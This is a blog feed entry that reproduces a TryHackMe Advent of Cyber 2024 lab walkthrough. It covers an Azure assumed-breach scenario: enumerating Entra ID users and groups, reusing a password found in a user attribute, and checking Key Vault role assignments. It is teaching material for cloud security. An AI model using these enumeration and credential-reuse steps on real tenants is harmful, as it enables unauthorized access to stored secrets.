<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-16T19:44:10-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">TryHackMe Advent of Cyber 2024 -Day 16</title><link href="http://localhost:4000/Day16" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 -Day 16" /><published>2024-12-16T00:00:00-05:00</published><updated>2024-12-16T00:00:00-05:00</updated><id>http://localhost:4000/Day16</id><content type="html" xml:base="http://localhost:4000/Day16"><![CDATA[<h1 id="the-story">The Story</h1>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822609983.png" alt="Task banner for day 16." /></p>

<p>Another day, another challenge and, unfortunately for McSkidy, another intrusion in their Azure tenant. Before joining McSkidy in her investigation, there’s some catching up to do, and this is a story best told in rhyme: \n</p>

<p><em>As SOC-mas approached, so did the need,</em></p>

<p><em>To provide those without, with something to read.</em></p>

<p><em>Care4Wares tried, they made it their mission,</em></p>

<p><em>A gift for all wares, a SOC-mas tradition.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p><em>McSkidy logged on and felt some confusion,</em></p>

<p><em>An alert saying here, a detected intrusion.</em></p>

<p><em>Inspection began as to what was at fault,</em></p>

<p><em>It seems access was gained to McSkidys key vault.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p><em>She checked and she checked as she had to be sure,</em></p>

<p><em>But it hadn’t been long since adopting Azure.</em></p>

<p><em>Troubleshooting ensued, ideas had been tabled,</em></p>

<p><em>Which would have been great, if logs were enabled.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p><em>With three hours slept,</em></p>

<p><em>And no records kept.</em></p>

<p><em>McSkidy then knew,</em></p>

<p><em>What she needed to do.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p><em>It’s true that on her, this town does depend,</em></p>

<p><em>But to find what was wrong, she needed a friend.</em></p>

<p><em>So clearing her throat and preparing her pitch,</em></p>

<p><em>She picked up her phone and called up the Glitch.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>It was late. Too late. McSkidy’s eyelids felt as though they had dumbbells attached to them. The sun had long since waved goodbye to Wareville, and the crisp night air was creeping in through the window of McSkidy’s office. If only there were a substance which would both warm and wake her up. Once McSkidy’s brain cells had started functioning again, and remembered that coffee existed. Checking her watch, she was saddened to learn it was too late to get her coffee from her favourite Wareville coffee house, Splunkin Donuts; the vending machine downstairs would have to do. Sipping her coffee, McSkidy immediately lit up and charged back into the office, ready to crack the case; however, as she entered, the Glitch had an idea of his own. He’d got it, and he figured out an attack vector the user had likely taken! McSkidy took a seat next to the Glitch, and he began to walk it through.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822466501.png" alt="Azure logo wrapped in Xmas decorations" /></p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Learn about Azure, what it is and why it is used.</li>
  <li>Learn about Azure services like Azure Key Vault and Microsoft Entra ID.</li>
  <li>Learn how to interact with an Azure tenant using Azure Cloud Shell.</li>
</ul>

<h2 id="intro-to-azure-n">Intro to Azure \n</h2>

<p>Before diving into the Glitch’s idea of the attacker’s path, let’s introduce some of the key concepts that will be covered in the process. We are going to start by introducing Azure. To do that, let’s consider why McSkidy is using Azure in the first place.</p>

<p>It all started when McSkidy’s role as the cyber security expert of Wareville really started to take off. Before she knew it, McSkidy was in very high demand and needed to create all kinds of resources to help her organise her duties; these included a web application to handle appointment making, multiple machines running for investigations, and more machines running for evidence storing and analysis. McSkidy hosted and managed all of these machines herself, that is, on-prem (on-premises). This initially wasn’t a massive issue because, after all, she wasn’t a corporation but just helping the citizens of Wareville with cyber security matters.</p>

<p>However, as time went on, McSkidy ran into issues during peak times when she would receive many requests for help, and therefore needed to process more evidence. All of this increased demand meant McSkidy had to scale up her resources to handle the load. To put a long story short, this was a lot of hassle for McSkidy. She wished there was a way for someone to handle her infrastructure on her behalf, especially when scaling her resources up (during peak times) and down (when they resumed). That’s when Azure came to the rescue.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822510157.png" alt="McSkidy and Azure working together in office" /> \n</p>

<p>Azure is a CSP (Cloud Service Provider), and CSPs (others include Google Cloud and AWS) provide computing resources such as computing power on demand in a highly scalable fashion. In other words, McSkidy could instead have Azure manage her underlying infrastructure, scaling it in times of increased demand and decreasing it once traffic resumed to normal levels. The best bit? McSkidy only has to pay for what she uses; gone were the days of buying physical infrastructure to handle increased loads, only for that infrastructure to go unused the majority of the time. \n</p>

<p>Azure (and cloud adoption in general) boasts many benefits beyond cost optimisation. Azure also gave McSkidy access to lots of cloud services ranging from identity management to data ingestion (quite frankly, there are more services than can be abbreviated in a sentence as, at the time of writing, there are over 200), these services can be used to build, deploy, and manage McSkidy’s current infrastructure as well as give her the options to upgrade or build new applications in the future given the range of services available. A couple of Azure services will come up during the Glitch’s attack path. Let’s take a look at them now:</p>

<p><strong>Azure Key Vault</strong></p>

<p>Azure Key Vault is an Azure service that allows users to securely store and access secrets. These secrets can be anything from API Keys, certificates, passwords, cryptographic keys, and more. Essentially, anything you want to keep safe, away from the eyes of others, and easily configure and restrict access to is what you want to store in an Azure Key Vault.</p>

<p>The secrets are stored in vaults, which are created by vault owners. Vault owners have full access and control over the vault, including the ability to enable auditing so a record is kept of who accessed what secrets and grant permissions for other users to access the vault (known as <strong>vault consumers</strong>). McSkidy uses this service to store secrets related to evidence and has been entrusted to store some of Wareville’s town secrets here.</p>

<p><strong>Microsoft Entra ID</strong></p>

<p>McSkidy also needed a way to grant users access to her system and be able to secure and organise their access easily. So, a Wareville town member could easily access or update their secret. Microsoft Entra ID (formerly known as Azure Active Directory) is Azure’s solution. Entra ID is an identity and access management (IAM) service. In short, it has the information needed to assess whether a user/application can access X resource. In the case of the Wareville town members, they made an Entra ID account, and McSkidy assigned the appropriate permissions to this account.</p>

<p>With that covered, let’s see what the Glitch has come up with.</p>

<h2 id="assumed-breach-scenario">Assumed Breach Scenario</h2>

<p>Knowing that a potential breach had happened, McSkidy decided to conduct an Assumed Breach testing within their Azure tenant. The Assumed Breach scenario is a type of penetration testing setup in which an initial access or foothold is provided, mimicking the scenario in which an attacker has already established its access inside the internal network.</p>

<p>In this setup, the mindset is to assess how far an attacker can go once they get inside your network, including all possible attack paths that could branch out from the defined starting point of intrusion.</p>

<h2 id="connecting-to-the-environment">Connecting to the Environment</h2>

<p>Before moving forward, review the questions in the connection card shown below: \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1731679222152.png" alt="Connection card for Cloud Access and Credentials." /> \n</p>

<p>For this Assumed Breach testing of Wareville’s tenant, McSkidy will provide valid credentials. To get the credentials, click the <strong>Cloud Details</strong> button below.</p>

<p>Next, click the <strong>Join Lab</strong> button to generate your credentials.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022044862.png" alt="Generating credentials for Azure." /> \n</p>

<p>You may view the credentials by clicking the <strong>Credentials</strong> tab.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022071488.png" alt="Viewing the credentials in the Credentials tab." /> \n</p>

<p>To use the credentials, click the <strong>Open Lab</strong> button in the <strong>Environment</strong> tab. This will open the <a href="https://portal.azure.com/">Azure Portal</a> login page, so kindly use the recently generated credentials to authenticate to the Azure Portal.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022209026.png" alt="Going to the Azure Portal via the Open Lab button." /> \n</p>

<p>After logging in, you will encounter an MFA configuration prompt. Kindly click the <strong>Ask Later</strong> button to proceed.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022425034.png" alt="Skipping the MFA configuration." /> \n</p>

<p>Lastly, click the <strong>Cancel</strong> button when prompted with the <strong>Welcome to Microsoft Azure</strong> banner.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022425433.png" alt="Skipping the Azure welcome banner." /></p>

<p><strong>Note:</strong> The Azure Portal may default to your local language, so you may follow these steps if you prefer to switch it to English.</p>

<ol>
  <li>Click on the settings icon in the top panel.</li>
  <li>On the right-hand side, click on “Language + Region”.</li>
  <li>Change the language to English (or your preferred choice) using the dropdown menu.</li>
  <li>Click the “Apply” button below.</li>
</ol>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1732022969184.png" alt="Configuring the language settings." /> \n</p>

<p><strong>Azure Cloud Shell</strong></p>

<p>Azure Cloud Shell is a browser-based command-line interface that provides developers and IT professionals a convenient and powerful way to manage Azure resources. It integrates both Bash and PowerShell environments, allowing users to execute scripts, manage Azure services, and run commands directly from their web browser without needing local installation. Cloud Shell has built-in tools and pre-configured environments, including Azure CLI, Azure PowerShell, and popular development tools, making it an efficient solution for cloud management and automation tasks.</p>

<p><strong>Azure CLI</strong></p>

<p>Azure Command-Line Interface, or Azure CLI, is a command-line tool for managing and configuring Azure resources. The Glitch relied heavily on this tool while reviewing the Wareville tenant, so let’s use the same one while walking through the Azure attack path.</p>

<p>As mentioned above, Azure CLI is part of the built-in tools inside the Cloud Shell, so go back to the <a href="https://portal.azure.com/">Azure portal</a> and launch Azure Cloud Shell by clicking on the terminal icon shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1731679657004.png" alt="Azure Portal Cloud Shell button." /> \n</p>

<p>Select Bash, since we will be executing Azure CLI commands.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efbaebdaaea011c857b438d/room-content/5efbaebdaaea011c857b438d-1729952192089.png" alt="Bash or PowerShell options for Azure Cloud Shell." /></p>

<p>To get started, select <code class="language-plaintext highlighter-rouge">No storage account required</code> and choose <code class="language-plaintext highlighter-rouge">Az-Subs-AoC</code> for the subscription.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efbaebdaaea011c857b438d/room-content/5efbaebdaaea011c857b438d-1729952373608.png" alt="Getting started instructions for Azure Cloud Shell." /></p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efbaebdaaea011c857b438d/room-content/5efbaebdaaea011c857b438d-1729952645147.png" alt="Initial Azure Cloud Shell prompt." /></p>

<p>At this point, we are ready to execute Azure CLI commands in the Azure Cloud Shell. Note that all the following commands are to be executed in the Azure Cloud Shell. \n</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">ad</span> <span class="nx">signed</span><span class="o">-</span><span class="k">in</span><span class="o">-</span><span class="nx">user</span> <span class="nx">show</span>

</code></pre></div></div>

<p>** \n Note:** You don’t need to authenticate using<code class="language-plaintext highlighter-rouge">az login</code>as you have already been authenticated into the Azure portal. \n</p>

<p>You can confirm that the credentials worked if the succeeding output renders the authenticated user details.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="p">{</span>
  <span class="dl">"</span><span class="s2">@odata.context</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://graph.microsoft.com/v1.0/$metadata#users/$entity</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">businessPhones</span><span class="dl">"</span><span class="p">:</span> <span class="p">[],</span>
  <span class="dl">"</span><span class="s2">displayName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">usr-xxxxxxxx</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">givenName</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">3970058b-7741-49c5-b1a7-191540995f7a</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">jobTitle</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">mail</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">mobilePhone</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">officeLocation</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">preferredLanguage</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">userPrincipalName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">usr-xxxxxxxx@aoc2024.onmicrosoft.com</span><span class="dl">"</span>
<span class="p">}</span>

</code></pre></div></div>

<h2 id="n-going-down-the-azure-rabbit-hole">\n Going Down the Azure Rabbit Hole</h2>

<p>When the Glitch got hold of an initial account in Wareville’s Azure tenant, he had no idea what was inside it. So, he decided to enumerate first the existing users and groups within the tenant.</p>

<p><strong>Entra ID Enumeration</strong></p>

<p>Using the current account, let’s start by listing all the users in the tenant. \n <strong>Note:</strong> This command might take a while depending on the amount of user accounts available, so feel free to skip it.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">ad</span> <span class="nx">user</span> <span class="nx">list</span>

</code></pre></div></div>

<p>\n The Azure CLI typically uses the following command syntax:<code class="language-plaintext highlighter-rouge">az GROUP SUBGROUP ACTION OPTIONAL_PARAMETERS</code>. Given this, the command above can be broken down into:</p>

<ul>
  <li>Target group or service: <code class="language-plaintext highlighter-rouge">ad</code> (Azure AD or Entra ID)</li>
  <li>Target subgroup: <code class="language-plaintext highlighter-rouge">user</code> (Azure AD users)</li>
  <li>Action: <code class="language-plaintext highlighter-rouge">list</code></li>
</ul>

<p><strong>Note:</strong> To see the available commands, you may execute <code class="language-plaintext highlighter-rouge">az -h</code> or <code class="language-plaintext highlighter-rouge">az GROUP -h</code>.</p>

<p>After executing the command, you might have been overwhelmed with the number of accounts listed. For a better view, let’s follow McSkidy’s suggestion to only look for the accounts prepended with <code class="language-plaintext highlighter-rouge">wvusr-</code>. According to her, these accounts are more interesting than the other ones. To do this, we will use the <code class="language-plaintext highlighter-rouge">--filter</code> parameter and filter all accounts that start with <code class="language-plaintext highlighter-rouge">wvusr-</code>.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">ad</span> <span class="nx">user</span> <span class="nx">list</span> <span class="o">--</span><span class="nx">filter</span> <span class="dl">"</span><span class="s2">startsWith('wvusr-', displayName)</span><span class="dl">"</span>

</code></pre></div></div>

<p>\n You may observe that an unusual parameter was set to a specific account in the output. One of the users,<strong>wvusr-backupware</strong>, has its password stored in one of the fields.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="p">...</span>
  <span class="p">{</span>
    <span class="dl">"</span><span class="s2">businessPhones</span><span class="dl">"</span><span class="p">:</span> <span class="p">[],</span>
    <span class="dl">"</span><span class="s2">displayName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">wvusr-backupware</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">givenName</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1db95432-0c46-45b8-b126-b633ae67e06c</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">jobTitle</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">mail</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">mobilePhone</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">officeLocation</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">REDACTED</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">preferredLanguage</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">userPrincipalName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">wvusr-backupware@aoc2024.onmicrosoft.com</span><span class="dl">"</span>
  <span class="p">},</span>
<span class="p">...</span>

</code></pre></div></div>

<p>\n When the Glitch saw this one, he immediately thought it could be the first step taken by the intruder to gain further access inside the tenant. However, he decided to continue the initial reconnaissance of users and groups. Now, let’s continue by listing the groups.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">ad</span> <span class="nx">group</span> <span class="nx">list</span>
<span class="p">[</span>
  <span class="p">{</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
    <span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Group for recovering Wareville's secrets</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">displayName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Secret Recovery Group</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">expirationDateTime</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
  <span class="p">}</span>
<span class="p">]</span>

</code></pre></div></div>

<p>\n <strong>Note:</strong> You may observe that we just changed the previous command from <code class="language-plaintext highlighter-rouge">az ad user list</code> to <code class="language-plaintext highlighter-rouge">az ad group list</code>.</p>

<p>Given the output, it can be seen that a group named <code class="language-plaintext highlighter-rouge">Secret Recovery Group</code> exists. This is kind of an interesting group because of the description, so let’s follow the white rabbit and list the members of this group.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">ad</span> <span class="nx">group</span> <span class="nx">member</span> <span class="nx">list</span> <span class="o">--</span><span class="nx">group</span> <span class="dl">"</span><span class="s2">Secret Recovery Group</span><span class="dl">"</span>
<span class="p">[</span>
  <span class="p">{</span>
    <span class="dl">"</span><span class="s2">@odata.type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">#microsoft.graph.user</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">businessPhones</span><span class="dl">"</span><span class="p">:</span> <span class="p">[],</span>
    <span class="dl">"</span><span class="s2">displayName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">wvusr-backupware</span><span class="dl">"</span><span class="p">,</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
  <span class="p">}</span>
<span class="p">]</span>

</code></pre></div></div>

<p>\n Given the previous output, it looks like everything makes a little sense now. All of the previous commands seem to point to the<code class="language-plaintext highlighter-rouge">wvusr-backupware</code> account. Since we have seen a potential set of credentials, let’s jump to another user by clearing the current Azure CLI account session and logging in with the new account.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">account</span> <span class="nx">clear</span>
<span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">login</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">EMAIL</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">PASSWORD</span>

</code></pre></div></div>

<p>\n <strong>Note:</strong> Replace the values with the actual email and password of the newly discovered account.</p>

<p><strong>Azure Role Assignments</strong> \n</p>

<p>Since the <code class="language-plaintext highlighter-rouge">wvusr-backupware</code> account belongs to an interesting group, the Glitch’s first hunch is to see whether sensitive or privileged roles are assigned to the group. And his thought was, “It doesn’t make sense to name it like this if it can’t do anything, right McSkidy?”. But before checking the assigned roles, let’s have a quick run-through of Azure Role Assignments.</p>

<p><strong>Azure Role Assignments</strong> define the resources that each user or group can access. When a new user is created via Entra ID, it cannot access any resource by default due to a lack of role. To grant access, an administrator must assign a <strong>role</strong> to let users view or manage a specific resource. The privilege level configured in a role ranges from read-only to full-control. Additionally, <strong>group members can inherit a role</strong>when assigned to a group. \n</p>

<p>Returning to the Azure enumeration, let’s see if a role is assigned to the Secret Recovery Group. We will be using the <code class="language-plaintext highlighter-rouge">--all</code> option to list all roles within the Azure subscription, and we will be using the <code class="language-plaintext highlighter-rouge">--assignee</code> option with the group’s ID to render only the ones related to our target group.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">role</span> <span class="nx">assignment</span> <span class="nx">list</span> <span class="o">--</span><span class="nx">assignee</span> <span class="nx">REPLACE_WITH_SECRET_RECOVERY_GROUP_ID</span> <span class="o">--</span><span class="nx">all</span>
<span class="p">[</span>
  <span class="p">{</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
    <span class="dl">"</span><span class="s2">principalName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Secret Recovery Group</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">roleDefinitionName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Key Vault Secrets User</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">scope</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets</span><span class="dl">"</span><span class="p">,</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
  <span class="p">},</span>
  <span class="p">{</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
    <span class="dl">"</span><span class="s2">principalName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Secret Recovery Group</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">roleDefinitionName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Key Vault Reader</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">scope</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets</span><span class="dl">"</span><span class="p">,</span>
    <span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
  <span class="p">}</span>
<span class="p">]</span>

</code></pre></div></div>

<p>\n <strong>Note:</strong> You may retrieve the group ID from the command executed previously: <code class="language-plaintext highlighter-rouge">az ad group list</code>.</p>

<p>The output seems slightly overwhelming, so let’s break it down.</p>

<ul>
  <li>First, it can be seen that there are two entries in the output, which means two roles are assigned to the group.</li>
  <li>Based on the <code class="language-plaintext highlighter-rouge">roleDefinitionName</code> field, the two roles are <code class="language-plaintext highlighter-rouge">Key Vault Reader</code> and <code class="language-plaintext highlighter-rouge">Key Vault Secrets User</code>.</li>
  <li>Both entries have the same scope value, pointing to a Microsoft Key Vault resource, specifically on the <code class="language-plaintext highlighter-rouge">warevillesecrets</code> vault.</li>
</ul>

<p>Here’s the definition of the roles based on the <a href="https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles">Microsoft documentation</a>:</p>

<table>
  <thead>
    <tr>
      <th><strong>Role</strong></th>
      <th><strong>Microsoft Definition</strong></th>
      <th><strong>Explanation</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Key Vault Reader</td>
      <td>Read metadata of key vaults and its certificates, keys, and secrets.</td>
      <td>This role allows you to read metadata of key vaults and its certificates, keys, and secrets. Cannot read sensitive values such as secret contents or key material.</td>
    </tr>
    <tr>
      <td>Key Vault Secrets User</td>
      <td>Read secret contents. Only works for key vaults that use the ‘Azure role-based access control’ permission model. \n</td>
      <td>This special role allows you to read the contents of a Key Vault Secret.</td>
    </tr>
  </tbody>
</table>

<p>After seeing both of these roles, McSkidy immediately realised everything! This configuration allowed the attacker to access the sensitive data they were protecting. Now that she knew this, she asked the Glitch to confirm her assumption.</p>

<p><strong>Azure Key Vault</strong></p>

<p>With McSkidy’s guidance, the Glitch is now tasked to verify if the current account, <strong>wvusr-backupware</strong>, can access the sensitive data. Let’s list the accessible key vaults by executing the command below.</p>

<p>Azure Cloud Shell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">usr</span><span class="o">-</span><span class="nx">xxxxxxxx</span> <span class="p">[</span> <span class="o">~</span> <span class="p">]</span><span class="nx">$</span> <span class="nx">az</span> <span class="nx">keyvault</span> <span class="nx">list</span>
<span class="p">[</span>
  <span class="p">{</span>
    <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">location</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">eastus</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">warevillesecrets</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">resourceGroup</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">rg-aoc-kv</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">tags</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
      <span class="dl">"</span><span class="s2">aoc</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">rg</span><span class="dl">"</span>
    <span class="p">},</span>
    <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Microsoft.KeyVault/vaults</span><span class="dl">"</span>
  <span class="p">}</span>
<span class="p">]</span>

</code></pre></div></div>

<p>\n The output above confirms the key vault discovered from the role assignments named<code class="language-plaintext highlighter-rouge">warevillesecrets</code>. Now, let’s see if secrets are stored in this key vault.</p>

<p>Azure Cloud Shell</p>

